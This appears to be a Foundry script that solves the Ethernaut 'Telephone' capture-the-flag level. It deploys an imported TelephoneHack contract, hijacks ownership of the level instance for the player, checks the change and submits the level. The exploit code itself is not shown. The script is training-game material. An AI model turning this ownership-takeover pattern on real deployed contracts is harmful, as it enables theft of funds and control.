// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

// It is the template file for each level

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";
import {TelephoneHack} from "../src/4_Telephone/TelephoneHack.sol";

interface Instance {
    function owner() external view returns (address);
}

contract LevelScript is EthernautScript {
    address level = 0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);

        instance = Instance(createLevelInstance(level, 0));
    }

    function hack() internal {
        TelephoneHack _telephone = new TelephoneHack(address(instance));
        require(instance.owner() != player);
        _telephone.SolidityBuild(player);
        // _telephone.YulBuild(player);
        require(instance.owner() == player);
    }

    function run() public {
        hack();
        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
// forge script ./script/4_Telephone.s.sol --broadcast
